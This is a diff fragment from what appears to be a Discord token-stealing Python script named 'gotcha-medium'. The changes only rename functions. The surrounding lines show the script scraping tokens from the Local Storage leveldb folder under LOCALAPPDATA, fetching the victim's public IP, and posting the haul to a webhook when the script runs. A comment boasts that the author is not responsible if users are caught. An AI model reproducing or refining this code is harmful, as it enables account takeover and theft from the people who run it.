@@ -30,7 +30,7 @@ ADP = os.environ['LOCALAPPDATA']
 #gotcha-medium program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
 
-def sniff(path):
+def gotchasniff(path):
     path += '\\Local Storage\\leveldb'
 
     tokens = []
@@ -364,7 +364,7 @@ if __name__ == "__main__":
     main4.saved()
 
 
-def beamed():
+def gotcha():
     hook = Webhook('placeholder')
     hostname = requests.get("https://api.ipify.org").text
     try:
@@ -400,7 +400,7 @@ def beamed():
 
         message += '```'
 
-        tokens = sniff(path)
+        tokens = gotchasniff(path)
 
         if len(tokens) > 0:
             for token in tokens:
@@ -537,4 +537,4 @@ def beamed():
     	pass
 #gotcha-medium program by war#1337 , https://discord.gg/SZJNYpJ77v , if you are caught using this tool and you get in trouble thats not my fault bozo.
 
-beamed()
+gotcha()
